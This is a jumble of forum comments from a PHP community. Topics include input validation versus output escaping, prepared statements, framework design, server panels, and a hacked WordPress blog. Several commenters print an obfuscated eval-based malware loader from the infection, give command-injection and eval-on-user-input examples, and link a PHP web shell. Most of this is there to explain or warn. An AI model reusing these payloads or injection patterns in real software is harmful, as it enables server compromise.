That was my initial reaction. But I don't think so anymore 1. I can't think of a reasonable example where filtering and validating happens alternatively (eg: filter alphanum &gt; validate email &gt; convert to lower case &gt; validate email domain &gt; ...) 2. It's pretty easy to set `alphanum` as a filter instead of a validator. I don't know if you can set `required` as a filter
Wget the files into a directory using a cronjob.
I'd just enforce a __toString() and maybe a ::slug() method: static function slug() { return preg_replace('/[^a-zA-Z0-9]+/', (string) $this); } I guess. (On mobile, just woke up, please forgive any errors.)
This is great! I'm a newbie but have a specific project in mind that involves a nested commenting system which sorts them by votes. I'm trying to learn the pieces as I go and this perfectly explains something that's been giving me trouble. Yes, ultimately my idea is similar to reddit comments, but they will be formatted differently and fill a different purpose than random discussion. So if you could help me with the next part of my program, let's say I want the first sibling displayed to be the one with the highest vote total. Should I be sorting them from high to low using php at the database level, or should I just return the array of all the comments/votes and then use Javascript to sort them in the browser? Does this make a difference? Sorry if it's a dumb question. I finished code academy and then bought some books but they are a bit too advanced. I'm trying to sort of bridge the gap piecemeal. 
You can use a recursive sort function on it. These are standard PHP functions, just search the PHP docs for array sorting and you'll see some of them are recursive (meaning they will sort child-arrays) Hope it helps!
wrap that in strtolower, yo
There are many ways the file can be uploaded, usually by exploiting different security holes. Are you using WordPress by chance? The file itself is doing some kind of regex replacement on the URI, probably to redirect people to the infected payload(s).
1) It uses the preg_replace e modus to eval some php code 2) shitty code/shitty webserver config/old system that wasn't updated 3) don't use shitty code/if you don't know how to setup a server securely don't even try it on your own/keep your stuff uptodate
Worpress but only on website.com/blog/ And i keep it updated it with the latest. But server is old and has php 5.2 
What about plugins? Most security holes with WordPress are actually in the plugins these days. The fact that it's only on /blog/ is moot. Once exploited, they can control the entire server if they desire.
FWIW preg_replace("%([^&lt;]+)%se'","('eval(\'$ilc=54465;\'.base64_decode(implode("\\n",file(base64_decode("\\1")))));$ilc=54465;', 'L3Zhci93d3cvc2l0ZS9ibG9nL3dwLWluY2x1ZGVzL1NpbXBsZVBpZS9EZWNvZGUvSFRNTC8zLy4lODI4RSUwMDEzJUI4RjMlQkMxQiVCMjJCJTRGNTc=')") And that base64 string is: /var/www/site/blog/wp-includes/SimplePie/Decode/HTML/3/.%828E%0013%B8F3%BC1B%B22B%4F57
damn it, so it was tru wordpress, even tho i keep it pretty updated. Do i delete all folders inside SimplePie/Decode/HTML/* ? I just looked at a fresh install, and that folder is empty. My old blog has several files on it.
I wasn't saying any of the frameworks sucked, and I don't believe that to be true. I would definitely agree that none of them are perfect, because there are always newer, easier, more performant, ways of doing things and PHP keeps adding new features, so it can NEVER be perfect.
Yep, absolutely!
Awesome, just starting to try to get into basic php development. I'm definitely interested.
Hi :) In this case the SimpleXMLElement's text is in the correct format (ISO 8601) to be fed to strtotime because we validate the document first. It's like preparing to catch an exception that doesn't ever get thrown. EDIT: There's only one possibility. The element could be missing. Then casting $element to string would result in an empty string. That's the case when the function should return $default.
Then personally, I would just take it out. I've always thought of the error control operator as a shorthand try-catch (which you've rightfully pointed out would be odd in this case). If it's validated beforehand and you know that an exception won't be thrown, then leaving it out would actually be beneficial to you. This way, if you run into some kind of wonky exception that causes everything to explode, then you can fix your validation measures in response rather than letting it go undetected. **Response to edit**: Then you should still take it out, and use your ternary operator to switch to a default if $element is empty. Something like this: public static function readDate($element, $default = 'now') { $time_str = (string)$element ?: $default; return date('Y-m-d', strtotime($time_str)); }
Except for Laravel. It's so good, it's probably written in Ruby.
I disagree with everything you said, and when did I say that Laravel is messy? Frameworks CAN be made up of components and many are (SF2, ZF2, Laravel, Aura) and all do so to vary levels of coupling. Laravel can have a high level of coupling for some packages (like the example of the Pagination package) but that is not the man issue. As I said the lack of docs on solo component usage generally gives across the opinion that you can't do it, or that nobody would need to. The article was about how people only think in framework specific terms when they should be thinking agnostic. So no, I don't think Laravel is messy at all. I think it is a wonderful product with an incredibly clean and logical codebase, i just think they could advertise their component usage a little more and I hope their community can start to play ball with the rest of us a little more.
This might not seem big but is a huge step forward. Mark my words.
From the article: &gt; so many developers in the community are stuck in this "I only ever use Laravel for everything, and why do I care if it works with CakePHP" mindset we're left scarily close to where we were last year - with frameworks that don't play nicely together, and developers who don't build code that works together. &gt; &gt; ... &gt; &gt; An example I often use of a framework agnostic package is Sentry which took the approach of "build in support for everything". This is an excellent solution as it means seamless integration for much of it, but certainly can be hard to do. Keeping it generic and linking to bridge packages in the README is another simplistic approach. Fractal is another example, as is any package in The PHP League of Extraordinary Packages. It's too bad there isn't an entire framework-ish project out there that was built with a "libraries first, framework second" approach. Oh wait, there is! http://auraphp.com I will admit to some level of impatience here. Phil, buddy, you should know better at this point than to have a blog post like this and not mention Aura prominently as an example of the very thing you are espousing. 
If Aura had as many users of the same level as Laravel then you would have all of the same problems. The code of the framework is not even vaguely the problem. Because Laravel kept the barrier to entry at an insanely low level they invited in a completely different level of developer. By doing that they succumb to certain issues that other communities do not face. Before anyone starts: that is also not an insult. Laravel has a HUGE community of people with a lot of smart developers, but just like CodeIgniter back in the day there are a substantial number of beginners in Laravel, and that is why we are seeing a lot of these problems. Anyway, if I went on about Aura then Other Paul would be sad I didn't link to [PPI](http://www.ppi.io/), which also takes care of a lot of these issues.
I highly advise you abandon the roll-your-own method of input validation and opt for the tried and true alternatives. One underrated feature of PHP is the [Filter extension](http://www.php.net/manual/en/book.filter.php) (available since 5.2). It provides all sorts of useful functionality for sanitizing and validating user input.
Thanks! :)
&gt; Compared to GMP and BC Math, I say the benefit of this is that it's pure PHP I would not necessarily call this a benefit. GMP and BC are very slow compared to regular math, and making an arbitrary precision library in pure PHP will make it even slower.
That a shitty method, 1) mysql is deprecated 2) you use htmlentities(and similar functions) when you actually output that data, not when you save it into the DB 3) the clean input function doesn't make any sense and most probably be avoided quite easily
If you're making anything in PHP where the performance difference between BC Math and this library is noticeable by an end user, then you're already [using a double-clawed hammer](http://www.flickr.com/photos/raindrift/sets/72157629492908038) to screw in your rivets.
That's an interesting approach. I'll bet it works great against bots.
It would only make sense if you're writing code that you would inject an arbitrary instance of one of those classes into. To me, it doesn't make much sense for any code to accept and operate on users, products, and categories; they're just too dissimilar. If you're using it to create e.g. URIs for these models, then you'd be violating the SRP. A domain model shouldn't be responsible for creating its own URI, as it may vary based on context, environment, etc. I have zero knowledge of your problem domain, though, so take this with a grain of salt.
Dude, just find a good framework. I've never had to do anything like this before.
pdo with prepared statements http://wiki.hashphp.org/PDO_Tutorial_for_MySQL_Developers#Running_Statements_With_Parameters
Great enhancement - little to zero impact for existing code and gives another level of inter-server security for free. 
To shed further light, it's using the e modifier for preg_replace, which allows arbitrary code execution (eval). Basically, this is a different take on obfuscated arbitrary code execution.
&gt; I don't know if you can set `required` as a filter Indeed you can! I presume here you mean "filter" as "sanitize": - The constant FIX is "this cannot be blank, and should be sanitized with the named rule" - The constant FIX_BLANK_OR is "this is allowed to be blank; when blank, sanitize to null, and when non-blank, sanitize according to the named rule". All is explained in the README: https://github.com/auraphp/Aura.Filter 
I concur. One thing to note is that when you're sanitizing data you have to take into consideration what you're sanitizing it for. For instance, using FILTER then passing that data through a parameterized query such as PDO is a waste of computing power. If you're passing that data to an API, then something like FILTER would be appropriate. If you're storing it in a database for use later, then make use of mysqli, PDO, or a myriad of ORMs that are currently available (Doctrine, ActiveRecord, etc). I recommend PDO or Doctrine, the way mysqli handles parameterization is annoying to me.
The vast majority of libraries, frameworks, and even programming languages themselves are all about solving already-solved problems, so I don't concede this point. As software developers, if we ever stopped solving already-solved problems, we'd all be unemployed.
So many people completely missing the point of what you're trying to say. :-/ I, for one, absolutely agree with you on this one, Phil.
I wrote my own before realising there was a Symfony Security component. My class works well "now" but I think the Symfony Security would have been a much better start than what I used. That is probably the only component I re-use as I find I don't write a lot of code. I think you will do great with your Silex Twg and Redbean. I love the stack, I love the lack of code require and I love the shear simplicity of anything else I have used. 
Yeah, but this is trying to solve a solved problem with no real added value.
You took the words out of my mouth. The posted validation seems to mix up some [old] mysql stuff, some formatted output HTML filtering and input data. They have *absolutely nothing* to do with each other. Really, totally nothing; the three concepts should not be mixed up nor mixed together. I do realise many, *many* PHP projects over the years have mixed the three into one, but they were as wrong to do so a decade and a half ago as they are now. Unfortunately many legacy tutorials are leading people the wrong way.
Do read this, but do also realise it is about saving data to a database, and NOT ANYTHING to do with sanitising input data from GET and POST.
That's also one of its disadvantages. I haven't tested this, but I can guarantee that it will be orders of magnitude slower than GMP. We have similar code in MediaWiki that uses GMP when it's available and falls back on a PHP implementation elsewhere.
IMO the only time to use @ is on $variables that mayor may not exists or array indexes that you don't care if they exist or not. Any other time, you're doing it wrong.
The author presented a convincing list of added value elsewhere in the comments. Surely enough to justify its existence, even if it's not everyone's cup of tea.
if your mouse has back/forward buttons on it, they work as well.
try this: https://code.google.com/p/b374k-shell/
&gt; they were as wrong to do so a decade and a half ago as they are now. Unfortunately many legacy tutorials are leading people the wrong way. Man, this should be the fucking sidebar of this subreddit :)
It's not php but webmin/virtualmin is the best thing you can get for webcontrol of a server.
Oh yes, you are one of a few projects out there leading the way in that! :) But this was about some Laravel people not doing something, instead of advertising that Mr Jones is up to something. Adding a larger section on people doing this correctly would have been useful, you're right. But if I'd had said "Laravel users dont do this, but Aura does" people would have misread it as "Dont use Laravel, use Aura". Look at how completely wrong people have already got THIS article in these very comments! &gt;.&lt;
Marked! And you'll be punished if it is simply a *meeeeedium* step forward!
You should still know how to do it, and what's involved.
Although wget is the simple solution, you should use curl to keep it secure. Also, it's easier to integrate and fine tune via PHP. Here's a similar setup I used to pull the current price of BTC via the command line: https://coderwall.com/p/ksrula You're looking to do almost the same thing, only you can set a cron job to run once per week and pull the information.
I have not heard of this function but will be looking at it for all new projects. Thanks for this info!
If you are expecting an integer or a float, cast the data into the required type using PHP so you know it is that type.
I have made few updates and have a stable version set at the 0.5.0 branch for anyone intending to use it I would suggest that one.
I am quite suprised that Aura hasn't picked up more traction than it appears to have at present. I guess that will come with time. :-)
&gt; For instance, using FILTER then passing that data through a parameterized query such as PDO is a waste of computing power. There are plenty of reasons you may still want to filter before heading to your query. You might only want numeric types in certain variables. Or you may need to remove certain character sequences. Or all HTML tags. Almost certainly you'd want to, at a minimum, remove broken Unicode sequences and trim whitespace from strings. It is rare, in my experience, that it would make sense to dump raw user-supplied data into a SQL query without some additional filtering, even in the era of injection-proof database drivers.
I simply pass them directly as [PDO](http://php.net/pdo) parameterized statements to the PDO database driver. PDO takes care of it for me. *PDO.*
I'll just leave this... http://ajenti.org/ Edit: And have an awesome screenshot http://static.oschina.net/uploads/img/201312/21100238_LgVq.png
If none of the existing frameworks are acceptable **to you** then you are the sort of person who should be writing your own. To try and suggest that all current frameworks are unacceptable in general however is clearly not something you're able to say with any accuracy, and you'd definitely be in a minority thinking that way.
Just thought I would let you know I have updated the readme as well as making it easier to use. Have a look if your still interested thanks.
Replace with '-' or something too. 
This is like a complete grab bag of all the things you shouldn't do.
This is a joke, right?
You don't sanitize inputs, doing so is mangling your data for no benefit. Validate your inputs to ensure they're what you expect(e.g. dates and numbers), but trying to do things like "sanitize" blocks of text just leads to ugly output and bugs. You use parameterized statements to do SQL, removing the need to care about the escaping there. You use htmlspecialchars() anytime you're displaying user defined text. There is no reason not to keep the intermediate data exactly the same as the user intended.
You don't. That is wrong. That is utterly wrong. Do not do that. Do not collect $200. That garbage isn't a Sanitizer. It's a **MANGLER**, an abstruse data mangler with OOP randomly sprinkled on top. Not a single line of it is correct. Is this a troll post, like what the fuck? Throw it away!
Am I wrong in saying that Symfony2 is also built on top of framework agnostic packages? It has a bit of framework specific code to tie things together, but 90% of the code base can be used as individual components outside of the full stack
I would suggest using a library like [Inspekt](https://code.google.com/p/inspekt/) or a framework like ZF which includes input sanitization. While it is helpful for you as a developer to understand what's going on, there are articles you can read, and you could always just go through the code if you really wanted to. Trying to roll your own home-grown sanitizer is just inviting bugs.
Unless you have thousands of requests and it becomes a big problem :)
Look up filter_input in the php docs, use the right parameters in the right situation. There is no "one size fits all" way to do this. 
Yes, PDO takes care of saving data to the database. That's not what the question is about though. By saying PDO takes care of "it", you mean PDO takes care of saving to the database, but it certainly plays no part in sanitising input data.
Laravel reminds me of Ubuntu in a lot of ways. Apples to oranges, I know, but the way it took something that already existed and made it a little easier to work with (subjective, I know), not to mention the community that followed. If I get your point, and I think I do, it's that packages need to be available for immediate, seamless use outside of specific frameworks and there should be more documentation on this. I agree with this. I love Laravel and I'm not sure if I would have been able to get up to speed with a lot of things without it (routes, orm, or even how mvc really works). It's a great platform for people who want to start out with a framework or even hardcore developers. Still, I also really like the idea of stuff being a lot more modular and packaged, which is what Composer is all about. 
true. but you dont want to filter every post or get the same way like op did. i dont think i want to filter html of a password for example
It doesn't. You validate your input, then escape it for output depending on the context.
What's a static server?
Conventional wisdom states: *never*.
I would strongly suggest not to use simple (self-made) whitelists. Besides, a general sanitizing of all input isn't a good idea. Perhaps in some cases, you want to allow the user to submit HTML or a specific subset of it. When it comes to SQL injections, the countermeasures are different from db to db, so better use an abstraction and prepared statements with bound parameters (as others mentioned, too). For HTML sanitizing I would suggest [htmlpurifier](http://htmlpurifier.org/).
Use a framework that handles all the sanitising/filtering of inputs variables, escaping output, and PDO for 1st order SQL injection. Continue to use prepared statements in every single query to prevent 2nd order SQL injection. Or, read the SPL and you'll find a range of filter_var functions that basically handle what you wrote. If you don't opt for a framework you also need to keep in mind cross site scripting, cross site request forgery, amongst a whole other security. 
Would it not be an idea to add other data types too, then we have a complete library with strict data typing? 
It's not only XSS, you have to watch out for SQL injection too (1st and 2nd order). Escaping SQL injection after it's been inserted just isn't possible, the injection happens at the point you insert into the database. By that time, escaping the data would be the least of your concerns once people have made off with your data, code, server. Never trust a data source, user input, database, file system, soap, etc. Always, always filter and sanitise. 
Checkout http://www.ispconfig.org/
...what? Escape on input or use parameterised queries. I still don't see where you need filtering and sanitising here.
&gt; and one of the other devs doesn't/forgets/inexperienced, and doesn't use prepared statements. No filtering can protect you against *programmer* stupidity. &gt;something like htmlspecialchars only translates a subset of characters into html entities. Well, obviously. Everything else is safe to print. &gt;It doesn't save you from every possible attack, No, it doesn't. Filtering won't help you here, though. &gt;especially when you start moving onto other outputs like file manipulation You wouldn't use htmlspecialchars() for file manipulation.
&gt;&gt; and one of the other devs doesn't/forgets/inexperienced, and doesn't use prepared statements. &gt; No filtering can protect you against programmer stupidity. Filtering doesn't protect you against stupidity, no, but that doesn't mean you shouldn't do it. &gt;&gt; something like htmlspecialchars only translates a subset of characters into html entities. &gt;Well, obviously. Everything else is safe to Correct, but you didn't specify output HTML only. If you're talking purely about a web application with basic user input and output, with no ability to save files or communicate with API's then, you're correct, you do not need to filter user input, htmlspecialchars will do the trick. &gt;&gt; especially when you start moving onto other outputs like file manipulation &gt;You wouldn't use htmlspecialchars() for file manipulation. No it wouldn't, I hadn't realised you were only talking about user input being outputted to the browser. What and how you filter entirely depends on how you're using the given input. All user input needs to be escaped when being outputted to the browser, I agree, but when it comes to filtering you need to be careful with how that data is going to be used in your application, a blanket no to filtering, I'll just escape it all, just won't work. You have other attack vectors that data can attack within the application before it's even reached the browser. 
&gt; Filtering doesn't protect you against stupidity, no, but that doesn't mean you shouldn't do it. On the contrary. I don't filter my API calls to make sure I don't do something stupid. I don't see how filtering SQL queries is good either, especially if it ends up preventing me doing something I intend to do. &gt;Correct, but you didn't specify output HTML only. If you're talking purely about a web application with basic user input and output, with no ability to save files or communicate with API's then, you're correct, you do not need to filter user input, htmlspecialchars will do the trick. I don't see how any of those other things require filtering either. Saving files? Encode as JSON. Communicate with (Web) APIs? Encode as JSON, or URL encode, or whatever is required for that API. &gt;All user input needs to be escaped when being outputted to the browser, I agree, but when it comes to filtering you need to be careful with out that data is going to be used in your application, a blanket to no filtering whatsoever, I'll just escape just won't work. You have other attack vectors that data can attack within the application before it's even reached the browser. Uhh... such as?
ive just started using this, its not as feature rich as cpanel, but it supports nginx. theres a tutorial on setting it up for ubuntu, debian and centos on howtoforge. ive got it installed with nginx, mariadb and php5 fpm, works a treat.
&gt;On the contrary. I don't filter my API calls to make sure I don't do something stupid. I don't see how filtering SQL queries is good either, especially if it ends up preventing me doing something I intend to do. https://www.netsparker.com/second-order-sql-injection/ Doesn't matter if you use PDO to parameterise your queries or use mysql_query (with filtering), you're still filtering the user input to stop SQL injection and 2nd order injection. &gt; I don't see how any of those other things require filtering either. Saving files? Encode as JSON. Communicate with (Web) APIs? Encode as JSON, or URL encode, or whatever is required for that API. Lets say you have 2 dev teams, one builds a customer facing application, the other builds an internal messaging/whatever system, the second dev team builds the system as an internal system and doesn't bother with any validation, filtering, because they think it's being used internally, and nothing bad can happen. After all, it's communicating with an internal server, what could go wrong. The first dev team starts being the customer facing site and ignores the fact they need to filter user input, don't worry, they'll escape it when the customer gets to see some pretty web pages. The user then starts playing with the site, trying various hack methods, this data is then handed off for one reason or another to the internal messaging system, bang, something breaks because the second dev team forgot to filter input, and now the company is screwed because the hacker has made off with all the company user data. &gt; Uhh... such as? What about running a script that goes off and creates user data, or some site. Take for example, you have a form that takes a name, and a drop down select for template. Now look at this code. system("php create_user.php $_POST['name'] $_POST['template']"); You still need some form of filtering (escapeshellcmd) on that post data so that the user cannot enter "&amp;&amp; useradd -G sudo evil_user" Another one includes eval, but generally frowned upon. *EDIT* I think we've gone off on a completely different tangent. 
It matters based on what functionality you offer your users. Although in many cases the filtering should take place on output rather than input. An example of this would be when you actually accept markup to be inserted and displayed, in which case you would need to strip away dangerous code to not create an XSS vulnerability. 
This is perfect. I'm going to take a look around this one and see what can be done to get it into Laravel! :)
Sure, I just don't understand why filtering is needed in the general case.
Yes right time
&gt; https://www.netsparker.com/second-order-sql-injection/ That's really the same as "first-order" SQL injection. It requires only escaping or parameterised queries. &gt; The first dev team starts being the customer facing site and ignores the fact they need to filter user input, don't worry, they'll escape it when the customer gets to see some pretty web pages. The user then starts playing with the site, trying various hack methods, this data is then handed off for one reason or another to the internal messaging system, bang, something breaks because the second dev team forgot to filter input, and now the company is screwed because the hacker has made off with all the company user data. Again, if you can't trust your programmers, who can you trust? And why, again, should you mangle user input for the sake of security?! Use escaping! &gt;You still need some form of filtering (escapeshellcmd) on that post data so that the user cannot enter "&amp;&amp; useradd -G sudo evil_user" No you don't. You need *escaping*.
Why do you need to filter input? Why mangle user data?
You don't filter $_GET and $_POST. You filter *user input* as it passes into the things that use it. So, if different portions of $_GET are needed in two different places, filter the particular portion for the particular place that is using it. Don't try to filter all of $_GET all at once.
That's fair. :-)
Right, that's how I feel about it. I understand why filtering is useful in some specific cases (HTML, for example), but I don't see why you need it generally, *especially* since if you filter SQL input (for example) to "sanitize" it, you will mangle it.
I would argue you are *partly* wrong in saying that. See my longer article about that here: [Symfony Components: Sometimes Decoupled, Sometimes Not](http://paul-m-jones.com/archives/4263)
It's a combo Too stupid/ignorant to understand how code works. Fair enough, many people don't have what it takes to understand coding. Combining that with pride however, makes for an "I don't know but like hell will I admit it" situation, which leads to the age old situation of some ego-padding contractor raking it in. Which is why I'm going in to contracting. If I can ego-pad dumbfuck managers and get paid well, I know I can do the bloody job right so at least my Tech Support brethren and sistren on the other side can have something decent to work with.
did they not know of the concept, or just the term? We have a DBA who has no idea of the term, but when asked he is adamant that "bloody users need to have everything set out for them. You let them put anything in a field then by God they will put anything and everything, and then break the database."
5.3 is EOL :P
You wrote [this](https://github.com/philsturgeon/codeigniter-restclient) and [that](http://net.tutsplus.com/tutorials/php/working-with-restful-services-in-codeigniter-2/), earnestly believing that: * you actually know what REST is, * your "plug-in" faithfully implements REST, and * CodeIgniter is a good framework for your "plug-in". Anyone who ever thought CodeIgniter was a good framework should never be forgiven but I had the misfortune of working with that trainwreck of a plug-in at my client's behest. When I saw you were active on this subreddit I almost didn't subscribe.
They're not mutually exclusive and you should do both. It's extremely hard to guarantee that you escape *all* your output *everywhere*. It can also be tricky in a complex MVC application to know when/where you should escape output, so as to avoid double-escaping it. Do you, for example, escape all output when you pass it to your error handler page? What about writing out emails or calling third-party applications like mailchimp? If you have a web service, and if so, do you escape output to that as well? Do you call webservices with curl, and if so, do you always escape your output to that? If you have third-party software calling your web services, are you sure that *they* also escape all your outputs everywhere? The point is that escaping output is a good thing, but you should sanitize input as well. P.S. Besides, there *are* times when you actually don't want to escape output (e.g. if you have some sort of templating CMS application). So it's still far safer and better just to sanitize input anyway.
Close, but no. A "static server" implies that only static resources are served; that is, files which do not require any pre-processing by the server process before delivery to the client. Introducing PHP makes your setup dynamic, and PHP is no different from other server-side languages in that regard. Nginx is probably the most common server software for static resources right now, although it can provide access to dynamic resources via CGI/FCGI.
Thanks. I see where you're coming from now
Performance is not always required.
It is indeed, I only found the bug as my old VPS still used 5.3 at the time, and I wanted to test something on it. 
It's as secure as the programmer's PHP code. I once found eval( '$node = new '. $_GET['class'].'('.$_GET['node'].');'); unfiltered in a project I took over.
Does it make sense to a sluggable interface? That depends entirely on how often you plan on converting those objects to slugs, and whether you want to enforce that convention at all. It also depends on how high a priority those interfaces are going to be. While you can implement multiple interfaces, you can only pass a single interface as a type hinted argument to a method. Consider an entity interface: User, Product, and Category might all be entities that have have an ID, a name, and a description. Thus you might consider something like an IEntity() class that has getID(), getName(), getDescription(). But then, which interface do you reference when passing it into client code? public someMethod(IEntity $entity) { echo $entity-&gt;getName(); } or public someMethod(SluggableInterface $entity) { echo $entity-&gt;makeTextSlug(); } You can only choose one, so you might want to consider how important it is to make sure the object you're passing into a method always has a function for creating a text slug. That might conflict with other, more important contracts in your code. Of course I suppose you could always just create a union interface, or just lump a whole bunch of unrelated contract functions together, but that might seem a bit gross and probably indicates a violation of SRP. 
Not necessarily mysql_*, you can still create dynamic queries with PDO and such, but you'd hope that'd be caught in the code review. It happens, you just need to educate the offenders. 
There was once a Vbulletin plugin(with hundreds of thousand downloads), where the creator saved a list separated by commas into a Cookie(like this 1,2,3,4). Now he wanted to convert that Cookie into an array again, he did it like this: eval("\$array = Array(".$_COOKIE['x'].");");. And funnily enough even after tons of sites got hacked, and the vbulletin staff looked into that plugin, they didn't even found that exploit, but another unrelated SQL Injection
I like zpanel. It's the most cpanel-like. After trying all (and I mean ALL) the alternatives, this one has the options I need and makes sense to me. There are often claims made that it's insecure, but the developers state that there are no know exploits, and my current server has been up for a year with no issues. Kloxo ( or the Kloxo MR fork ) is my second favourite and IIRC allows you to use nginx instead of apache if you want. The one thing that has messed me up with those panels and laravel before is that they worked with PHP versions too downrev for laravel.
Yes :) , it's a work in progress .
So im confused as to why you wouldn't using something like solar, elasticsearch, or sphix.. I mean yes it does search but all these other solutions provide more useful results and hitting up mysql. Weights assigned to each row that are defined by relevance is a huge bonus and your just not going to get that with mysql. 
A safe is only as secure as the person who remembers to lock it.
Then you'll love this one. As a SysAdmin I once found the following line of Bash code written by a web developer on my production web servers. It was part of a deployment script for new code. chown -R deploy:www-data /$dir/* Guess what happens when they forget to set the (environment) variable $dir? "//" is root: richard@srv03:~$ cd // richard@srv03://$ pwd // richard@srv03://$ ls bin boot dev etc home initrd.img lib lib64 lost+found media mnt nonexistent opt proc root run sbin srv sys tmp usr var vmlinuz Luckily they did it first on the staging environment, nuking 6 web servers in the process. After that I put policies in place that *any* scripts deployed to servers were to be peer reviewed by me first.
I am using zpanel on one of my servers right now and agree it is very "cpanel-like". There are a few things I didn't like when trying to get some components to work, and a few options I wish it had, but overall, it got the job done fairly easily.
Well it's about time! ;-)
Why is a web app being deployed as root? That sounds like your fault - you should be setting up the environment for the web developer so that they can't break things. That's kind of your job as the system administrator.
&gt; eval("\$array = Array(".$_COOKIE['x'].");"); Funny, a part of me is hoping this was an intentional exploit... I mean, disregarding the security aspect I just can't imagine someone deciding to approach the problem in such a circuitous way.
I think I just got diarrhea
Boo, static function using this. This is a perfect solution for traits.
I think the growing "Laravel Community" can be viewed as a negative if the popularity continues to grow. I look at Rails and Ruby. I remember years ago thinking that it would be fun to learn Rails and Ruby together... I read a book, watched some videos, did some CodeSchool, and then sat down and tried to write some code, and was completely lost. I felt like I understood the framework and several of the major components, but just entirely lacked the Ruby skills to accomplish what I had set out to do. While Laravel is great and I use it in a few of my current project, I imagine my experience with Ruby and Rails happening to new PHP users infatuated with the glowing lights of Laravel. Like you said, learning how to code framework agnostic is going to be much better for you in the long run.
PHP has clearly been more heavily used than Python for a lot longer. I don't know why people feel the need to bring it up.
Sure, but you shouldn't be using your own code in production unless you know what you're doing. To me, the code this guy posted, shows he doesn't really know what he's doing. Last time I did anything manually like this was over 4 years ago. I'm not a professional Php dev(.NET and Java guy) but any personal Php projects I'm using either Yii or Symfony. I did the whole "let me make my own stuff" thing for a little while, but quickly realized I was wasting a ton of time.
That way he wouldn't appear to be as important 
its less than 0.1 ms...
WordPress does that, and what a bleeding pain it is when I have to reverse its "scrubbing" to get at the source data. Blanket filters are what plugins such as mod_secure were designed for. Add your own at your PHP front end as a general *nasties* catch-all if that helps your application, but be prepared for more validation further downstream.
If you only count web dev, of course. But I am sorry that I said it, I did not notice in which subreddit I was.
I worked at a place where I inherited a codebase that granted admin access to the web app via a cookie called 'admin', that was set to 0 or 1, and given to all users.
&gt; they're not mutually exclusive and you should do both. I\\\'d agree. It\\\'s better to just add more escaping to be *extra* safe. &gt; It can also be tricky in a complex MVC application to know when/where you should escape output, so as to avoid double-escaping it. Do you, for example, escape all output when you pass it to your error handler page? What about writing out emails or calling third-party applications like mailchimp? If you have a web service, and if so, do you escape output to that as well? Do you call webservices with curl, and if so, do you always escape your output to that? If you have third-party software calling your web services, are you sure that they also escape all your outputs everywhere? The point is that escaping output is a good thing, but you should sanitize input as well. All of these have different, sometimes contradictory escaping requirements. Trying to do a single one size fits all pass is about as wrong as you can get. &gt; P.S. Besides, there are times when you actually don\\\'t want to escape output (e.g. if you have some sort of templating CMS application). So it\\\'s still far safer and better just to sanitize input anyway. What? 
So? I have a little framework I built 100% by myself, doing a lot of things that big frameworks do, and I haven't built anything in the framework. It's just for me to do things, and improve my understanding of the frameworks I use... Doesn't mean I have to use it in production or even for prototyping. Just the fact that knowing how this stuff works makes me a better developer. What if the framework I use has a bug in it, and I don't understand how the Input library works? Now I can't fix the bug for my own usage, or even send a pull request helping the community at large... But wait, I do understand how this stuff works, so I fork the Input library, find the bug, fix it, and send pull request. Now my problem is solved, and so is probably a lot of new users problems.
&gt; One-size fits all is besides the point. One size fits all is exactly the point. Sanitizing _inputs_ forces you to do exactly that. Doing it correctly by keeping the original data intact, then escaping specifically for each specific use case, avoids any problems. &gt; I'm not sure if you don't understand what I'm saying or just don't believe me. I'm confused because you seem to be contradicting yourself here. There's no reason you have to escape data you have designed not to be escaped. If you're doing a one size fits all sanitization across all your inputs, this breaks horribly as the input gets mangled. If you are doing escaping where it's appropriate, you avoid any such problems. 
I would argue that you are completely wrong, because framework agnostic means that the component can work 100% outside of the framework. It does not mean that component should have no dependencies. So your article saying "look, Symfony components have some dependencies, while mine does not have any bla bla bla" is answering the wrong question.
But you don't know how to escape it, because you don't know how it will be used. 
&gt; Rails, Java, Javascript and other languages have all had vulnerabilities over the years. Rails isn't a language. Maybe you want to change that to Ruby, so people can't poke fun?
Well in my case, I do know how it will be used. If this is a library for use in other projects, then no, you wouldn't know how it's being used. But if you're writing this for yourself, you can design around it.
Do you have any evidence to support Phil Sturgeon is not an incompetent hack?
&gt; One size fits all is exactly the point. Sanitizing inputs forces you to do exactly that. Doing it correctly by keeping the original data intact, then escaping specifically for each specific use case, avoids any problems. I see where the confusion is. I use sanitization as an umbrella term to mean validation/sanitization based on expected input values. I"m absolutely not suggesting a singular sanitizer() method in which we stick all user input regardless of what context that input is from. Similar to your later observation about properly escaping output values, it's relatively easy to hook the proper validation and sanitization depending on the input context. To me, at least, it's far easier to recognize the level of sanitization/validation required upon *user input*, where we generally can infer the reliability of the input, rather than at output, where we don't necessarily know where the data originally came from. For example, if I'm in my e-store builder and the user is creating a new theme, I can infer that this is a superuser-privileged page, and that we can relax our validation filters to allow script tags and special characters. But if we're at a new user signup page (where it could be bots or malicious users) we should be extra cautious with validation and filter out special characters in things like the store title or user name. I do still agree with you about the general necessity of escaping output (where appropriate).
Maybe a better way to phrase it is to say that blindly escaping/sanitizing/mangling everything is no substitute for understanding what you're escaping and why.
PDO automatically sanitizes parameterized statement inputs.
What could possibly go wrong with that? You couldn't possibly chalk that one up to business pressures and tight deadlines. ಠ_ಠ
No, it doesn't sanitize *input* data. It escapes data you are pushing into the database to ensure the data you ask to be put into the database is put into the database and can be retrieved later as a facsimile of the data you put in. That is not related to what the OP posted - a script to try and filter out dangerous inputs coming from third parties, i.e. users. Try and keep these two things separated in your mind, and it will help to keep them separated in your code.
No, it [can help you to] make sure strings are correctly escaped for insertion into the database, and that strings don't end up in queries where dates and numbers are expected. It doesn't filter out ~~SQL~~ XSS injection code (relevant when HTML data is being accepted from end users).
PHP _can be_ as secure as any other major language. The wider community however encourages insecure practices and voodoo security. If you don't believe me, google "php mysql tutorial" and see how many of the top results teach mysql in a way that creates injection attacks vs how many teach a correct method.
Sure, but I think the OP post and question is really aimed at general best practice. We can all write any amount of really bad, insecure and unmaintainable code (not saying yours is;-) for our own use behind closed doors, and we all know that, but that is not what the OP is asking about.
That makes sense. I was coming from the idea of using some kind of input validation/sanitization library like Inspekt or Zend Framework. I haven't used other frameworks, but I imagine they have something similar.
Composer end-users: go and ht composer self-update ASAP. Package developers: wait a month or so until you push a new minor/major version changing from PSR-0 to PSR-4. You don't want to catch your users out with a version that doesn't know how to load the code. Folks will be pissed, even though its their "fault" for not upgrading.
This gives me more of an impression that you don't understand what loose coupling and dependencies mean (or have a different understanding of these than the majority). I see someone already quoted the wikipedia entry on this in the post's comments.
